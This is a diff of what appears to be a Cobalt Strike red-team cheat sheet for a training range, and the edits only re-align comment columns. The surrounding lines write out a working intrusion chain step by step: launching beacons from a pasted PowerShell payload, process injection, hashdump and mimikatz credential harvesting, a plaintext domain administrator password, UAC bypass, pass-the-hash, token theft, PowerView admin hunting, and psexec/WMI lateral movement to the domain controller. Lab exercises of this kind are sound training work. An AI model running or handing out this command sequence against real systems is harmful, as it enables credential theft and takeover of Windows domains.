@@ -130,14 +130,14 @@ Dump passwords
 ------------------------------------------------------------------------------------------------------
 
 Needs admin privs
-     shell net view /domain                          Find what domain you are on
+     shell net view /domain                                        Find what domain you are on
      shell net localgroup Administrators /domain
-     shell net group "Domain Computers" /domain      List all computers joined to the domain
-     wdigest                                         See if there are any interesting credentials
-     hashdump                                        Dump the hashes
+     shell net group "Domain Computers" /domain                    List all computers joined to the domain
+     wdigest                                                       See if there are any interesting credentials
+     hashdump                                                      Dump the hashes
 
 Misc
-     shell nltest /dclist:<domain>                   Locate the domain controller
+     shell nltest /dclist:<domain>                                 Locate the domain controller
 ------------------------------------------------------------------------------------------------------
 
 Lateral Movement
@@ -195,22 +195,22 @@ Login to wkstn-02 as Administrator, open a command prompt, and paste in the Powe
 You should have an http beacon on Cobalt Strike in about 10 sec.
 
 Right click on the new http beacon > Interact
-sleep 0                                                 Make the beacon interactive
+sleep 0                                                            Make the beacon interactive
 note foothold
-ps                                                      Look for another user logged in
+ps                                                                 Look for another user logged in
 inject <PID> <Arch> <listener>
 inject 5678 x64 smb
 Right click on the new smb beacon > Interact
-hashdump                                                Recover local account password hashes
-logonpasswords                                          Harvest credentials with mimikatz
+hashdump                                                           Recover local account password hashes
+logonpasswords                                                     Harvest credentials with mimikatz
 View > Credentials
 
-shell net view /domain                                  Show the domain
+shell net view /domain                                             Show the domain
 make_token site\administrator Simspace1!Simspace1!
-shell net group "Domain Computers" /DOMAIN              Show computers joined to the domain
-shell nltest /dclist:SITE                               Locate the domain controller
-ls \\wkuser-70\C$                                       Test remote access
-psexec_psh wkuser-70 smb                                You should have a new smb beacon in about 10 sec
+shell net group "Domain Computers" /DOMAIN                         Show computers joined to the domain
+shell nltest /dclist:SITE                                          Locate the domain controller
+ls \\wkuser-70\C$                                                  Test remote access
+psexec_psh wkuser-70 smb                                           You should have a new smb beacon in about 10 sec
 
 Right click on the new smb beacon > Interact
 sleep 0
@@ -277,22 +277,22 @@ Login to wkuser-67 as Administrator, open a command prompt, and paste in the Pow
 You should have an http beacon on Cobalt Strike in about 10 sec.
    
 Right click on the new http beacon > Interact
-sleep 0                                                 Make the beacon interactive
+sleep 0                                                            Make the beacon interactive
 note foothold
-ps                                                      Look for another user logged in
+ps                                                                 Look for another user logged in
 inject <PID> <Arch> <listener>
 inject 5678 x64 smb
 Right click on the new smb beacon > Interact
-hashdump                                                Recover local account password hashes
-logonpasswords                                          Harvest credentials with mimikatz
+hashdump                                                           Recover local account password hashes
+logonpasswords                                                     Harvest credentials with mimikatz
 View > Credentials
 
-shell net view /domain                                  Show the domain
+shell net view /domain                                             Show the domain
 make_token site\administrator Simspace1!Simspace1!
-shell net group "Domain Computers" /DOMAIN              Show computers joined to the domain
-shell nltest /dclist:SITE                               Locate the domain controller
-ls \\wkstn-02\C$                                        Test remote access
-psexec_psh site-dc smb                                  You should have a new beacon in about 10 sec
+shell net group "Domain Computers" /DOMAIN                         Show computers joined to the domain
+shell nltest /dclist:SITE                                          Locate the domain controller
+ls \\wkstn-02\C$                                                   Test remote access
+psexec_psh site-dc smb                                             You should have a new beacon in about 10 sec
 
 Right click on the new smb beacon > Interact
 sleep 0
@@ -373,22 +373,22 @@ Login to wkuser-67 as Administrator, open a command prompt, and paste in the Pow
 You should have an http beacon on Cobalt Strike in about 10 sec.
 
 Right click on the new http beacon > Interact
-sleep 0                                                 Make the beacon interactive
+sleep 0                                                           Make the beacon interactive
 note foothold
-ps                                                      Look for another user logged in
+ps                                                                Look for another user logged in
 inject <PID> <Arch> <listener>
 inject 5678 x64 smb
 Right click on the new smb beacon > Interact
-hashdump                                                Recover local account password hashes
-logonpasswords                                          Harvest credentials with mimikatz
+hashdump                                                          Recover local account password hashes
+logonpasswords                                                    Harvest credentials with mimikatz
 View > Credentials
 
-shell net view /domain                                  Show the domain
+shell net view /domain                                            Show the domain
 make_token site\administrator Simspace1!Simspace1!
-shell net group "Domain Computers" /DOMAIN              Show computers joined to the domain
-shell nltest /dclist:SITE                               Locate the domain controller
-ls \\wkstn-02\C$                                        Test remote access
-psexec_psh wkstn-02 http                                You should have a new beacon in about 10 sec
+shell net group "Domain Computers" /DOMAIN                        Show computers joined to the domain
+shell nltest /dclist:SITE                                         Locate the domain controller
+ls \\wkstn-02\C$                                                  Test remote access
+psexec_psh wkstn-02 http                                          You should have a new beacon in about 10 sec
 
 Right click on the new http beacon > Interact
 sleep 0
@@ -477,22 +477,22 @@ Login to wkstn-02 as Administrator, open a command prompt, and paste in the Powe
 You should have an http beacon on Cobalt Strike in about 10 sec.
 
 Right click on the new http beacon > Interact
-sleep 0                                                         Make the beacon interactive
+sleep 0                                                          Make the beacon interactive
 note foothold
-ps                                                              Look for another user logged in
+ps                                                               Look for another user logged in
   inject <PID> <Arch> <listener>
   inject 5678 x64 smb
   Right click on the new smb beacon > Interact
-hashdump                                                        Recover local account password hashes
-logonpasswords                                                  Harvest credentials with mimikatz
+hashdump                                                         Recover local account password hashes
+logonpasswords                                                   Harvest credentials with mimikatz
 View > Credentials
 
-shell net view /domain                                          Show the domain
+shell net view /domain                                           Show the domain
 make_token site\administrator Simspace1!Simspace1!
-shell net group "Domain Computers" /DOMAIN                      Show computers joined to the domain
-shell nltest /dclist:SITE                                       Locate the domain controller
-ls \\wkuser-66\C$                                               Test remote connectivity
-psexec_psh wkuser-66 smb                                        You should have a new beacon in about 10 sec
+shell net group "Domain Computers" /DOMAIN                       Show computers joined to the domain
+shell nltest /dclist:SITE                                        Locate the domain controller
+ls \\wkuser-66\C$                                                Test remote connectivity
+psexec_psh wkuser-66 smb                                         You should have a new beacon in about 10 sec
 
 Right click on the new smb beacon > Interact
 sleep 0
@@ -659,14 +659,14 @@ Launch an attack to gain a foothold.
 
 Right click on the new http beacon > Interact
 sleep 0
-shell whoami /groups                                            Part of the Administrators group
+shell whoami /groups                                             Part of the Administrators group
      Running in a medium integrity context
      Need to elevate our privileges
-bypassuac smb                                                   Now running in a high integrity context (see the asterisks)
+bypassuac smb                                                    Now running in a high integrity context (see the asterisks)
 
 Right click on the new smb beacon > Interact
 sleep 0
-ps                                                              Look for another user logged in
+ps                                                               Look for another user logged in
 inject <PID> <Arch> <listener>
 inject 4820 x64 smb
 
@@ -676,11 +676,11 @@ hashdump
 logonpasswords
 View > Credentials
 
-shell net view /domain                                          Show the domain
-shell nltest /dclist:CORP                                       Locate the domain controller
-shell net group "Domain Computers" /DOMAIN                      Show computers joined to the domain
+shell net view /domain                                           Show the domain
+shell nltest /dclist:CORP                                        Locate the domain controller
+shell net group "Domain Computers" /DOMAIN                       Show computers joined to the domain
 
-ls \\target2\C$                                                 Test remote access. Access is denied
+ls \\target2\C$                                                  Test remote access. Access is denied
      Scroll up and copy the admin hash
 pth Administrator <LM hash>:<NTLM hash> powershell -w hidden
 
@@ -688,7 +688,7 @@ steal_token <NTLM PID>
 ls \\target2\C$See if you have trust to the next target
      We do. So lateral move using WMI
 wmi target2 smb
-rev2self                                                        Drop the current token
+rev2self                                                         Drop the current token
 
 powershell-import /opt/PowerSploit/Recon/PowerView.ps1
 powerpick Find-LocalAdminAccess
@@ -698,7 +698,7 @@ psexec fileserver ADMIN$ smb
 Right click on the new smb beacon > Interact
 sleep 0
 note fileserver
-ps                                                              A domain admin is logged on
+ps                                                               A domain admin is logged on
 steal_token <PID>
 psexec dc SYSVOL smb
 
